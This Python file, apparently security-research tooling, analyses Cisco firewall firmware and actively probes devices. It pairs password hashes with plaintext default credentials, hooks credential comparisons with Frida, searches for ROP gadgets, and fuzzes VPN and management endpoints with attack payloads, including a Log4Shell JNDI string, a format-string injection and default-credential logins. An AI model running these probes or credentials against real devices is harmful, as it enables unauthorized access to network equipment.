"""
cisco_re_engine.py — Cisco-Focused RE Engine (ablation integration)
CONTROLLED ENVIRONMENT ONLY

Unified RE platform for Cisco firmware/binary analysis. Implements 8 modules:
  1. static_analysis   — FLOSS + capa + r2 on Cisco ELF binaries
  2. string_correlate  — map FLOSS strings to capa capabilities and code xrefs
  3. auth_hunt         — find auth/credential/crypto patterns in binary
  4. firmware_diff     — BinDiff/Diaphora semantic diff between firmware versions
  5. frida_trace       — real-time Frida instrumentation of running process
  6. exploit_surface   — ropper gadget discovery + keystone shellcode assembly
  7. protocol_fuzz     — Scapy-based Cisco management/VPN protocol fuzzer
  8. report            — unified findings report with CVE mapping

Entry: run_re_engine(binary_path, mode='static', **kwargs)

Cisco-specific heuristics:
  - lina auth string signatures (WebVPN, RADIUS, TACACS+, SAML, IKEv2)
  - DevAuth hash patterns (F-FTD-79)
  - sftunnel HMAC markers
  - Proprietary crypto constants (Cisco ASA DES/3DES key schedule)
  - FDM token/provision endpoint strings
  - Debug interface markers (gdbserver, SYS_ptrace, /dev/cisco0)
"""

# CONTROLLED ENVIRONMENT ONLY

import subprocess
import json
import os
import sys
import re
import hashlib
import struct
from pathlib import Path
from typing import Optional


# ─────────────────────────────────────────────────────────
# Tool paths
# ─────────────────────────────────────────────────────────

FLOSS_BIN   = "floss"
CAPA_BIN    = "capa"
R2_BIN      = "r2"
ROPPER_BIN  = "ropper"
BINDIFF_BIN = "bindiff"
FRIDA_BIN   = "frida"


# ─────────────────────────────────────────────────────────
# Cisco-specific string signatures for auth_hunt
# ─────────────────────────────────────────────────────────

AUTH_SIGNATURES = {
    "hardcoded_cred": [
        r"Admin123",  r"Sourcefire",  r"admin123",  r"snortrules",
        r"mbuser",    r"bonfire-app", r"password=\w+",
    ],
    "auth_bypass": [
        r"isDefaultProvider",  r"DevAuth",  r"passedAuthentication",
        r"easySetupDone",      r"isFesUrl", r"AnonymousAuthentication",
        r"isPasswordNotChanged",
    ],
    "crypto_key": [
        r"BEGIN (RSA|EC|DSA) PRIVATE KEY",
        r"vault\.key",  r"kek\.pl",  r"EncryptionUtil",
        r"AES.*key",    r"HMAC",     r"SHA256",
    ],
    "debug_interface": [
        r"gdbserver",  r"/dev/cisco0",  r"SYS_ptrace",
        r"DEBUGGING",  r"DEV_MODE",     r"debug_auth",
        r"devtoken",
    ],
    "network_listener": [
        r"bind.*:(443|8305|9090|5985|8200|11789|4070)",
        r"sftunnel",   r"pmtool",    r"NetMgmtAPI",
        r"eStreamer",  r"localhost:5985",
    ],
    "protocol_marker": [
        r"IKEv[12]",   r"DTLS",      r"CSTP",
        r"X-DTLS-Master-Secret",
        r"STRAP",      r"HPKE",      r"secp[0-9]+r1",
        r"WebVPN",     r"SAML",      r"lasso_profile",
    ],
    "privesc_indicator": [
        r"PERL5LIB",   r"LD_PRELOAD", r"sudo.*NOPASSWD",
        r"chmod.*[46]755",
        r"installpkg", r"SUID",       r"setuid",
    ],
}

# Known DevAuth SHA-256 hashes from F-FTD-79
DEVAUTH_HASHES = {
    "3b612c75a7b5048a435fb6ec81e52ff92d6d795a8b5a9c17070f6a63c97a53b2": ("admin",  "Admin123"),
    "87285c98748de9eb28e479eb93753834a4fe78969a86aa6cfcc69d322035bbf7": ("admin",  "Sourcefire"),
    "22b7dec7305d63e2c769b0c9141114e69a194cc853b444c73b7be3a0771b628a": ("admin",  "Admin123$"),
    "67f990abc31023dd7b3b1ce5fcb42700259a1c0b58e789cb2b9b11c6d8c66ccc": ("reader", "Reader123"),
    "38fd66646aba4dbf831717723ae1a1c865a7a71c865f90ed41ac1f8eae51ae49": ("reader", "Reader123$"),
    "fb02892b1036bdb626e591b38188d7310450eea2a198f468f09336d6d1b4e664": ("writer", "Writer123"),
    "42e7974de3ce2f369a50ce692f3665b4e42376b60e57416b57898dd94e322ec0": ("writer", "Writer123$"),
}


# ─────────────────────────────────────────────────────────
# Module 1: Static Analysis
# ─────────────────────────────────────────────────────────

def static_analysis(binary_path: str, output_dir: str = "/tmp/cisco_re") -> dict:
    """
    Run FLOSS + capa + r2 on a Cisco binary.
    Returns unified dict: {floss_strings, capa_capabilities, r2_imports, summary}
    """
    os.makedirs(output_dir, exist_ok=True)
    binary = Path(binary_path)
    stem = binary.stem
    results = {"binary": str(binary_path), "modules": {}}

    print(f"[static] Analyzing {binary.name} ({binary.stat().st_size // 1024 // 1024}MB)")

    # FLOSS — stack + decoded strings
    floss_out = Path(output_dir) / f"{stem}_floss.json"
    if not floss_out.exists():
        print(f"[static] Running FLOSS (this takes ~20-60 min on large binaries)...")
        r = subprocess.run(
            [FLOSS_BIN, str(binary_path), "--output-json", str(floss_out),
             "--no", "show-static-strings"],
            capture_output=True, text=True, timeout=7200
        )
        if r.returncode != 0:
            print(f"[static] FLOSS warning: {r.stderr[:200]}")
    else:
        print(f"[static] FLOSS: using cached {floss_out}")

    floss_data = {}
    if floss_out.exists() and floss_out.stat().st_size > 0:
        try:
            floss_data = json.loads(floss_out.read_text())
        except json.JSONDecodeError:
            pass

    # capa — capability fingerprinting
    capa_out = Path(output_dir) / f"{stem}_capa.json"
    if not capa_out.exists():
        print(f"[static] Running capa...")
        r = subprocess.run(
            [CAPA_BIN, str(binary_path), "--json"],
            capture_output=True, text=True, timeout=3600
        )
        if r.returncode == 0:
            capa_out.write_text(r.stdout)
        else:
            print(f"[static] capa warning: {r.stderr[:200]}")
    else:
        print(f"[static] capa: using cached {capa_out}")

    capa_data = {}
    if capa_out.exists() and capa_out.stat().st_size > 0:
        try:
            capa_data = json.loads(capa_out.read_text())
        except json.JSONDecodeError:
            pass

    # r2 — import table + entry points (fast, seconds)
    print(f"[static] Running r2 import analysis...")
    r2_out = Path(output_dir) / f"{stem}_r2.json"
    r = subprocess.run(
        [R2_BIN, "-q", "-e", "bin.cache=true", "-c", "iij", str(binary_path)],
        capture_output=True, text=True, timeout=300
    )
    r2_imports = []
    if r.returncode == 0:
        try:
            r2_imports = json.loads(r.stdout)
            r2_out.write_text(r.stdout)
        except json.JSONDecodeError:
            pass

    results["modules"]["floss"] = floss_data
    results["modules"]["capa"] = _extract_capa_summary(capa_data)
    results["modules"]["r2_imports"] = r2_imports
    results["modules"]["r2_import_names"] = [i.get("name", "") for i in r2_imports]

    print(f"[static] Done. FLOSS strings: {_count_floss_strings(floss_data)} | "
          f"capa matches: {len(results['modules']['capa'])} | "
          f"imports: {len(r2_imports)}")

    return results


def _extract_capa_summary(capa_data: dict) -> list:
    """Flatten capa rule matches into a list of capability dicts."""
    caps = []
    rules = capa_data.get("rules", {})
    for rule_name, rule_data in rules.items():
        meta = rule_data.get("meta", {})
        caps.append({
            "rule": rule_name,
            "namespace": meta.get("namespace", ""),
            "attack": meta.get("attack", []),
            "capability": meta.get("capability", ""),
        })
    return caps


def _count_floss_strings(floss_data: dict) -> int:
    count = 0
    for key in ("stackStrings", "decodedStrings", "tightStrings"):
        count += len(floss_data.get(key, []))
    return count


# ─────────────────────────────────────────────────────────
# Module 2: String Correlation
# ─────────────────────────────────────────────────────────

def string_correlate(static_results: dict) -> dict:
    """
    Cross-reference FLOSS strings against AUTH_SIGNATURES and capa capabilities.
    Groups strings by security category and links to capa matches.
    """
    floss_data = static_results.get("modules", {}).get("floss", {})
    capa_caps  = static_results.get("modules", {}).get("capa", [])
    r2_imports = static_results.get("modules", {}).get("r2_import_names", [])

    # Gather all deobfuscated strings
    all_strings = []
    for key in ("stackStrings", "decodedStrings", "tightStrings"):
        for entry in floss_data.get(key, []):
            s = entry if isinstance(entry, str) else entry.get("string", "")
            if s:
                all_strings.append(s)

    # Also pull static strings for hash scanning
    for entry in floss_data.get("staticStrings", []):
        s = entry if isinstance(entry, str) else entry.get("string", "")
        if len(s) == 64 and all(c in "0123456789abcdef" for c in s):
            all_strings.append(s)  # potential SHA-256 hash

    hits = {cat: [] for cat in AUTH_SIGNATURES}
    devauth_hits = []
    import_hits = []

    for s in all_strings:
        # Check DevAuth hashes
        if s in DEVAUTH_HASHES:
            user, pw = DEVAUTH_HASHES[s]
            devauth_hits.append({"hash": s, "user": user, "password": pw})

        # Category matching
        for cat, patterns in AUTH_SIGNATURES.items():
            for pat in patterns:
                if re.search(pat, s, re.IGNORECASE):
                    hits[cat].append(s)
                    break

    # Flag security-relevant imports
    security_imports = [
        "openssl", "EVP_", "RSA_", "HMAC_", "SHA256",
        "setuid", "setgid", "execve", "system", "popen",
        "ptrace", "mmap", "dlopen", "chmod",
    ]
    for imp in r2_imports:
        for sig in security_imports:
            if sig.lower() in imp.lower():
                import_hits.append(imp)
                break

    # Correlate with capa namespaces
    capa_security = [c for c in capa_caps if any(ns in c.get("namespace", "") for ns in
        ("network", "crypto", "privilege", "collection", "execution", "persistence"))]

    result = {
        "total_strings_analyzed": len(all_strings),
        "auth_hits": {k: list(set(v)) for k, v in hits.items() if v},
        "devauth_hash_hits": devauth_hits,
        "security_imports": list(set(import_hits)),
        "capa_security_caps": capa_security,
    }

    print(f"[correlate] Auth category hits: {sum(len(v) for v in result['auth_hits'].values())}")
    print(f"[correlate] DevAuth hashes found: {len(devauth_hits)}")
    print(f"[correlate] Security imports: {len(result['security_imports'])}")
    print(f"[correlate] capa security capabilities: {len(capa_security)}")

    return result


# ─────────────────────────────────────────────────────────
# Module 3: Auth Pattern Hunt (r2-based)
# ─────────────────────────────────────────────────────────

def auth_hunt(binary_path: str, output_dir: str = "/tmp/cisco_re") -> dict:
    """
    Use r2 to find auth-relevant patterns:
    - Functions with auth-related string xrefs
    - Comparison instruction sequences (signed vs unsigned)
    - Hardcoded immediate values matching known thresholds
    """
    os.makedirs(output_dir, exist_ok=True)
    binary = Path(binary_path)
    stem = binary.stem
    findings = []

    print(f"[auth_hunt] Scanning {binary.name} for auth patterns...")

    # r2 commands: search for auth-related strings and get xrefs
    auth_strings = [
        "Admin123", "Sourcefire", "passedAuthentication", "isDefaultProvider",
        "easySetupDone", "isFesUrl", "snortrules", "mbuser", "bonfire",
        "X-DTLS-Master-Secret", "sftunnel", "kek.pl", "PERL5LIB",
    ]

    for search_str in auth_strings:
        r = subprocess.run(
            [R2_BIN, "-q", "-e", "bin.cache=true",
             "-c", f'/c {search_str}',
             str(binary_path)],
            capture_output=True, text=True, timeout=120
        )
        if r.returncode == 0 and r.stdout.strip():
            for line in r.stdout.strip().split('\n'):
                if line.strip():
                    findings.append({
                        "type": "string_xref",
                        "string": search_str,
                        "location": line.strip(),
                    })

    # Find unsigned comparison patterns (cmp + ja/jae) — signedness mismatch candidates
    r = subprocess.run(
        [R2_BIN, "-q", "-e", "bin.cache=true",
         "-c", "/ad cmp",
         str(binary_path)],
        capture_output=True, text=True, timeout=300
    )
    cmp_hits = 0
    if r.returncode == 0:
        cmp_hits = len(r.stdout.strip().split('\n'))

    result = {
        "binary": str(binary_path),
        "auth_string_hits": findings,
        "cmp_instruction_count": cmp_hits,
    }

    print(f"[auth_hunt] Auth string hits: {len(findings)} | CMP instructions: {cmp_hits}")

    out_path = Path(output_dir) / f"{stem}_auth_hunt.json"
    out_path.write_text(json.dumps(result, indent=2))
    print(f"[auth_hunt] Results: {out_path}")

    return result


# ─────────────────────────────────────────────────────────
# Module 4: Firmware Diff
# ─────────────────────────────────────────────────────────

def firmware_diff(binary_a: str, binary_b: str,
                  output_dir: str = "/tmp/cisco_re") -> dict:
    """
    Semantic diff between two Cisco firmware binary versions.
    Uses BinDiff for function-level comparison, then classifies changes.

    binary_a: reference (older/patched) version
    binary_b: target (newer/unknown) version
    """
    os.makedirs(output_dir, exist_ok=True)
    name_a = Path(binary_a).name
    name_b = Path(binary_b).name

    print(f"[diff] Comparing {name_a} vs {name_b}")

    # Export both binaries via r2 for BinDiff
    # BinDiff needs .BinExport files generated by IDA/Ghidra plugin
    # Fallback: use r2's built-in radiff2 for function-level diff
    result = {"binary_a": binary_a, "binary_b": binary_b, "changes": []}

    r = subprocess.run(
        ["radiff2", "-AC", binary_a, binary_b],
        capture_output=True, text=True, timeout=600
    )
    if r.returncode == 0:
        changes = []
        for line in r.stdout.split('\n'):
            if line.strip() and not line.startswith('#'):
                parts = line.split()
                if len(parts) >= 3:
                    changes.append({
                        "addr_a": parts[0] if len(parts) > 0 else "",
                        "addr_b": parts[2] if len(parts) > 2 else "",
                        "similarity": parts[1] if len(parts) > 1 else "",
                        "classification": _classify_diff_change(line),
                    })
        result["changes"] = changes
        result["total_changed_functions"] = len(changes)

        # Flag security-relevant changes
        security_changes = [c for c in changes
                            if c["classification"] in ("auth_check", "crypto", "priv_check", "bounds_check")]
        result["security_relevant_changes"] = security_changes

        print(f"[diff] Changed functions: {len(changes)} | Security-relevant: {len(security_changes)}")
    else:
        print(f"[diff] radiff2 error: {r.stderr[:200]}")
        print(f"[diff] Note: For full BinDiff, generate .BinExport from Ghidra/IDA first")

    out_path = Path(output_dir) / f"diff_{name_a}_vs_{name_b}.json"
    out_path.write_text(json.dumps(result, indent=2))
    return result


def _classify_diff_change(diff_line: str) -> str:
    """Heuristic classification of a binary diff change."""
    low = diff_line.lower()
    if any(k in low for k in ("auth", "password", "cred", "token", "login", "easysetup")):
        return "auth_check"
    if any(k in low for k in ("crypto", "aes", "rsa", "hmac", "sha", "tls", "ssl")):
        return "crypto"
    if any(k in low for k in ("priv", "sudo", "setuid", "root", "escalat")):
        return "priv_check"
    if any(k in low for k in ("bound", "limit", "overflow", "length", "size", "count")):
        return "bounds_check"
    return "other"


# ─────────────────────────────────────────────────────────
# Module 5: Frida Trace
# ─────────────────────────────────────────────────────────

FRIDA_SCRIPT_AUTH = """
// Frida hook for Cisco FTD auth routines
// Targets: DevAuthenticationProvider, easySetupDoneFilter, sftunnel HMAC

'use strict';

// Hook strcmp/strncmp for credential comparison tracing
var strcmp_ptr = Module.findExportByName(null, "strcmp");
if (strcmp_ptr) {
  Interceptor.attach(strcmp_ptr, {
    onEnter: function(args) {
      var s1 = args[0].readUtf8String();
      var s2 = args[1].readUtf8String();
      if (s1 && s2 && (
          s1.length < 64 && (
            s1.indexOf('Admin') !== -1 || s1.indexOf('Sourcefire') !== -1 ||
            s1.indexOf('password') !== -1 || s1.indexOf('token') !== -1 ||
            s1.indexOf('admin') !== -1
          )
      )) {
        send({type: 'strcmp', s1: s1, s2: s2, bt: Thread.backtrace(this.context).map(DebugSymbol.fromAddress).join('|')});
      }
    }
  });
}

// Hook SHA-256 / HMAC for crypto key tracing
var sha256_ptr = Module.findExportByName(null, "SHA256") ||
                 Module.findExportByName(null, "SHA256_Final");
if (sha256_ptr) {
  Interceptor.attach(sha256_ptr, {
    onEnter: function(args) {
      send({type: 'sha256_call', bt: Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join('|')});
    }
  });
}

// Hook setuid/setgid for privilege escalation tracing
var setuid_ptr = Module.findExportByName(null, "setuid");
if (setuid_ptr) {
  Interceptor.attach(setuid_ptr, {
    onEnter: function(args) {
      send({type: 'setuid', uid: args[0].toInt32(), bt: Thread.backtrace(this.context).map(DebugSymbol.fromAddress).join('|')});
    }
  });
}

send({type: 'init', msg: 'Cisco auth tracer loaded'});
"""


def frida_trace(process_name: str, output_dir: str = "/tmp/cisco_re",
                script: Optional[str] = None) -> None:
    """
    Attach Frida to a running Cisco process for real-time auth tracing.
    Hooks strcmp, SHA-256, setuid by default.
    """
    os.makedirs(output_dir, exist_ok=True)
    frida_script = script or FRIDA_SCRIPT_AUTH
    script_path = Path(output_dir) / "frida_cisco_auth.js"
    script_path.write_text(frida_script)

    print(f"[frida] Attaching to: {process_name}")
    print(f"[frida] Script: {script_path}")
    print(f"[frida] Output: {output_dir}/frida_trace.jsonl")

    out_path = Path(output_dir) / "frida_trace.jsonl"

    # frida -p PID -l script.js --no-pause
    cmd = [FRIDA_BIN, "-n", process_name, "-l", str(script_path),
           "--no-pause", "-o", str(out_path)]
    print(f"[frida] Run: {' '.join(cmd)}")
    print(f"[frida] Ctrl-C to stop. Events written to {out_path}")

    try:
        subprocess.run(cmd, timeout=3600)
    except KeyboardInterrupt:
        pass
    except subprocess.TimeoutExpired:
        pass


# ─────────────────────────────────────────────────────────
# Module 6: Exploit Surface (ropper + keystone)
# ─────────────────────────────────────────────────────────

def exploit_surface(binary_path: str, output_dir: str = "/tmp/cisco_re",
                    constraint: str = "") -> dict:
    """
    Find ROP gadgets with ropper, assemble test shellcode with keystone.
    Returns top gadgets by type (syscall, pop-ret, jmp-reg).
    """
    os.makedirs(output_dir, exist_ok=True)
    binary = Path(binary_path)
    stem = binary.stem
    result = {"binary": str(binary_path), "gadgets": {}, "shellcode": {}}

    print(f"[exploit] Finding ROP gadgets in {binary.name}...")

    # ropper gadget categories
    gadget_types = {
        "syscall":   "syscall",
        "pop_rdi":   "pop rdi; ret",
        "pop_rsi":   "pop rsi; ret",
        "pop_rdx":   "pop rdx; ret",
        "jmp_rsp":   "jmp rsp",
        "xor_rax":   "xor rax",
    }

    for gtype, search in gadget_types.items():
        r = subprocess.run(
            [ROPPER_BIN, "--file", str(binary_path), "--search", search,
             "--nocolor", "-q"],
            capture_output=True, text=True, timeout=120
        )
        gadgets = []
        if r.returncode == 0:
            for line in r.stdout.split('\n'):
                line = line.strip()
                if line and '0x' in line and ';' in line:
                    gadgets.append(line)
        result["gadgets"][gtype] = gadgets[:10]  # top 10 per type
        print(f"[exploit] {gtype}: {len(gadgets)} gadgets found")

    # keystone: assemble a test NOP sled + breakpoint for verification
    try:
        import keystone
        ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)
        nop_sled = b"\x90" * 16
        shellcode_asm = "nop; nop; int3;"
        encoding, _ = ks.asm(shellcode_asm)
        test_sc = nop_sled + bytes(encoding)
        result["shellcode"]["test_nop_int3"] = test_sc.hex()
        print(f"[exploit] keystone test shellcode: {test_sc.hex()}")
    except ImportError:
        print(f"[exploit] keystone not available")

    out_path = Path(output_dir) / f"{stem}_exploit_surface.json"
    out_path.write_text(json.dumps(result, indent=2))
    return result


# ─────────────────────────────────────────────────────────
# Module 7: Protocol Fuzzer
# ─────────────────────────────────────────────────────────

def protocol_fuzz(host: str, port: int, protocol: str = "cstp",
                  output_dir: str = "/tmp/cisco_re") -> None:
    """
    Scapy-based fuzzer for Cisco management/VPN protocols.
    Protocols: cstp, dtls, ikev2, asdm, fdm_api
    CONTROLLED ENVIRONMENT ONLY
    """
    os.makedirs(output_dir, exist_ok=True)
    print(f"[fuzz] Target: {host}:{port} protocol={protocol}")
    print(f"[fuzz] CONTROLLED ENVIRONMENT ONLY")

    try:
        from scapy.all import IP, TCP, Raw, send as scapy_send, sr1
    except ImportError:
        print("[fuzz] scapy not available")
        return

    fuzz_log = Path(output_dir) / f"fuzz_{protocol}_{host}_{port}.jsonl"

    if protocol == "cstp":
        # CSTP handshake fuzzing — AnyConnect / WebVPN
        # Send malformed CSTP CONNECT with oversized headers
        cstp_templates = [
            # Normal CSTP CONNECT
            b"CONNECT /CSCOSSLC/tunnel HTTP/1.1\r\nX-CSTP-Version: 1\r\nX-CSTP-Hostname: fuzzer\r\n\r\n",
            # Oversized X-CSTP-Hostname
            b"CONNECT /CSCOSSLC/tunnel HTTP/1.1\r\nX-CSTP-Hostname: " + b"A" * 8192 + b"\r\n\r\n",
            # Malformed X-DTLS-Master-Secret header
            b"CONNECT /CSCOSSLC/tunnel HTTP/1.1\r\nX-DTLS-Master-Secret: " + b"Z" * 256 + b"\r\n\r\n",
            # Integer overflow attempt on protocol version
            b"CONNECT /CSCOSSLC/tunnel HTTP/1.1\r\nX-CSTP-Version: 65535\r\n\r\n",
        ]
        for i, template in enumerate(cstp_templates):
            pkt = IP(dst=host) / TCP(dport=port, flags="S")
            r = sr1(pkt, timeout=2, verbose=0)
            if r:
                data_pkt = IP(dst=host) / TCP(dport=port, flags="PA") / Raw(load=template)
                resp = sr1(data_pkt, timeout=3, verbose=0)
                result = {
                    "probe": i,
                    "payload_len": len(template),
                    "response": resp.summary() if resp else "no response",
                }
                with open(fuzz_log, 'a') as f:
                    f.write(json.dumps(result) + '\n')
                print(f"[fuzz] probe {i}: {result['response'][:80]}")

    elif protocol == "fdm_api":
        # FDM REST API fuzzing — malformed JSON, oversized tokens
        import ssl
        import urllib.request
        import urllib.error
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        payloads = [
            # Format string injection in grant_type
            '{"grant_type":"%s%s%s%s%s%s","username":"admin","password":"Admin123"}',
            # Stack overflow attempt in username
            '{"grant_type":"password","username":"' + 'A' * 4096 + '","password":"x"}',
            # Log4Shell injection in grant_type (F-FTD-95)
            '{"grant_type":"${jndi:ldap://127.0.0.1:1389/a}","username":"admin","password":"x"}',
            # Null byte injection
            '{"grant_type":"password\x00","username":"admin","password":"Admin123"}',
        ]
        url = f"https://{host}:{port}/api/fdm/v6/fdm/token"
        for i, payload in enumerate(payloads):
            try:
                req = urllib.request.Request(
                    url, data=payload.encode(),
                    headers={"Content-Type": "application/json"},
                )
                r = urllib.request.urlopen(req, context=ctx, timeout=5)
                result = {"probe": i, "status": r.status, "response": r.read(200).decode()}
            except urllib.error.HTTPError as e:
                result = {"probe": i, "status": e.code, "response": e.read(100).decode()}
            except Exception as ex:
                result = {"probe": i, "status": "error", "response": str(ex)[:100]}

            with open(fuzz_log, 'a') as f:
                f.write(json.dumps(result) + '\n')
            print(f"[fuzz] fdm probe {i}: {result['status']}")

    print(f"[fuzz] Log: {fuzz_log}")


# ─────────────────────────────────────────────────────────
# Module 8: Report
# ─────────────────────────────────────────────────────────

CISCO_CVE_MAP = {
    "Log4Shell":         "CVE-2021-44228",
    "log4j":             "CVE-2021-44228",
    "easySetupDone":     "F-FTD-60 (pre-auth admin takeover)",
    "DevAuth":           "F-FTD-79 (hardcoded DevAuth hashes)",
    "bonfire":           "F-FTD-82 (RabbitMQ default creds)",
    "snortrules":        "F-FTD-59 (static mbuser creds)",
    "ClamAV":            "F-FTD-81 (ClamAV heap overflow)",
    "neo4j":             "F-FTD-96 (Neo4j backup unauthenticated)",
    "PERL5LIB":          "F-FTD-73 (env_keep root exec)",
    "installpkg":        "F-FTD-85 (www sudo installpkg root)",
    "X-DTLS-Master-Secret": "F-FTD (DTLS master secret exposure)",
    "zip4j":             "F-FTD-67 (zip-slip config import)",
    "kek.pl":            "F-FTD-65 (KEK extraction)",
    "EncryptionUtil":    "F-FTD-65 (key encryption context)",
    "CVE-2019-0211":     "F-FTD-88 (Apache prefork scoreboard)",
    "CVE-2022-0778":     "F-FTD (OpenSSL BN_mod_sqrt inf loop)",
}


def report(correlate_results: dict, auth_results: dict,
           binary_path: str, output_dir: str = "/tmp/cisco_re") -> str:
    """
    Generate unified findings report with CVE mapping.
    Returns path to output markdown report.
    """
    os.makedirs(output_dir, exist_ok=True)
    stem = Path(binary_path).stem
    report_path = Path(output_dir) / f"{stem}_re_report.md"

    lines = [
        f"# Cisco RE Engine Report: {Path(binary_path).name}",
        "",
        "## Authentication Findings",
    ]

    # Auth category hits
    auth_hits = correlate_results.get("auth_hits", {})
    for cat, strings in auth_hits.items():
        if strings:
            lines.append(f"\n### {cat.upper()}")
            for s in strings[:20]:
                cve = next((v for k, v in CISCO_CVE_MAP.items() if k in s), "")
                cve_note = f" → {cve}" if cve else ""
                lines.append(f"  - `{s}`{cve_note}")

    # DevAuth hash hits
    devauth = correlate_results.get("devauth_hash_hits", [])
    if devauth:
        lines.append(f"\n### DEVAUTH HASHES (F-FTD-79)")
        for h in devauth:
            lines.append(f"  - user={h['user']} pw={h['password']} hash={h['hash'][:16]}...")

    # capa capabilities
    caps = correlate_results.get("capa_security_caps", [])
    if caps:
        lines.append(f"\n## Behavioral Capabilities (capa)")
        for c in caps[:30]:
            ns = c.get("namespace", "?")
            rule = c.get("rule", "?")
            lines.append(f"  - [{ns}] {rule}")

    # Security imports
    imports = correlate_results.get("security_imports", [])
    if imports:
        lines.append(f"\n## Security-Relevant Imports")
        for imp in sorted(imports)[:30]:
            lines.append(f"  - `{imp}`")

    # Auth hunt r2 results
    auth_string_hits = auth_results.get("auth_string_hits", [])
    if auth_string_hits:
        lines.append(f"\n## Auth String Xrefs (r2)")
        for h in auth_string_hits[:30]:
            lines.append(f"  - `{h['string']}` @ {h['location']}")

    lines.append(f"\n---\n*Generated by cisco_re_engine.py (ablation)*")

    report_path.write_text('\n'.join(lines))
    print(f"[report] Written: {report_path}")
    return str(report_path)


# ─────────────────────────────────────────────────────────
# Orchestrator
# ─────────────────────────────────────────────────────────

def run_re_engine(binary_path: str,
                  mode: str = "static",
                  output_dir: str = "/tmp/cisco_re",
                  binary_b: Optional[str] = None,
                  process_name: Optional[str] = None,
                  fuzz_host: Optional[str] = None,
                  fuzz_port: int = 443,
                  fuzz_protocol: str = "fdm_api") -> dict:
    """
    Orchestrate all RE modules.

    mode options:
      static     — FLOSS + capa + r2 only (default, no active probing)
      full       — static + string_correlate + auth_hunt + report
      diff       — firmware_diff against binary_b
      frida      — attach Frida to process_name
      exploit    — ropper + keystone gadget/shellcode analysis
      fuzz       — protocol_fuzz against fuzz_host:fuzz_port
      all        — run everything

    CONTROLLED ENVIRONMENT ONLY for frida/exploit/fuzz modes.
    """
    print(f"\n{'='*60}")
    print(f"Cisco RE Engine | mode={mode} | {Path(binary_path).name}")
    print(f"{'='*60}\n")

    results = {"binary": binary_path, "mode": mode, "output_dir": output_dir}

    if mode in ("static", "full", "all"):
        static = static_analysis(binary_path, output_dir)
        results["static"] = static

    if mode in ("full", "all"):
        corr = string_correlate(results.get("static", {}))
        results["correlate"] = corr

        auth = auth_hunt(binary_path, output_dir)
        results["auth_hunt"] = auth

        rpt = report(corr, auth, binary_path, output_dir)
        results["report_path"] = rpt

    if mode in ("diff", "all") and binary_b:
        diff = firmware_diff(binary_path, binary_b, output_dir)
        results["diff"] = diff

    if mode in ("frida", "all") and process_name:
        frida_trace(process_name, output_dir)

    if mode in ("exploit", "all"):
        exp = exploit_surface(binary_path, output_dir)
        results["exploit"] = exp

    if mode in ("fuzz", "all") and fuzz_host:
        protocol_fuzz(fuzz_host, fuzz_port, fuzz_protocol, output_dir)

    print(f"\n[engine] Complete. Output: {output_dir}")
    return results


# ─────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Cisco RE Engine (ablation)")
    parser.add_argument("binary", help="Path to Cisco binary (lina, httpsd, etc.)")
    parser.add_argument("--mode", default="full",
                        choices=["static", "full", "diff", "frida", "exploit", "fuzz", "all"],
                        help="Analysis mode")
    parser.add_argument("--output-dir", default="/tmp/cisco_re")
    parser.add_argument("--binary-b", help="Second binary for firmware diff")
    parser.add_argument("--process", help="Process name for Frida attach")
    parser.add_argument("--fuzz-host", help="Target host for protocol fuzzer")
    parser.add_argument("--fuzz-port", type=int, default=443)
    parser.add_argument("--fuzz-protocol", default="fdm_api",
                        choices=["cstp", "dtls", "fdm_api", "ikev2"])
    args = parser.parse_args()

    run_re_engine(
        binary_path=args.binary,
        mode=args.mode,
        output_dir=args.output_dir,
        binary_b=args.binary_b,
        process_name=args.process,
        fuzz_host=args.fuzz_host,
        fuzz_port=args.fuzz_port,
        fuzz_protocol=args.fuzz_protocol,
    )
